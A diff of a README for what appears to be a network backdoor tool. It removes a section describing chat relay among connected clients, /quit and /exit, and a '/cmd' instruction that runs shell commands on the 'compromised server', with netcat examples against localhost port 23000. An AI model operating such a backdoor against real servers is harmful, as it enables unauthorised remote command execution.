@@ -87,37 +87,3 @@ To exit the netcat session:
 <enter>
 <enter>
 ```
-
-### More instructions
-
-Each message submit by client is sent to all backdoor's clients like a chat. 
-However, an alone chat's feature is useless, there are a set of instructions allowed by all clients which have different behavior for taking advantage of the compromised server.
-
-#### Quit Client connection
-
-This instruction permit to logout the current user
-
-```bash
-/quit
-/exit
-```
-
-Example :
-
-```bash
-echo "/quit"|netcat localhost 23000
-```
-
-#### Shell Command Instruction
-
-This instruction permit to execute shell command from server. (OS supported : Linux, Windows)
-
-```bash
-/cmd <shell-command>
-```
-
-Example :
-
-```bash
-echo "/cmd ls -l"|netcat localhost 23000
-```
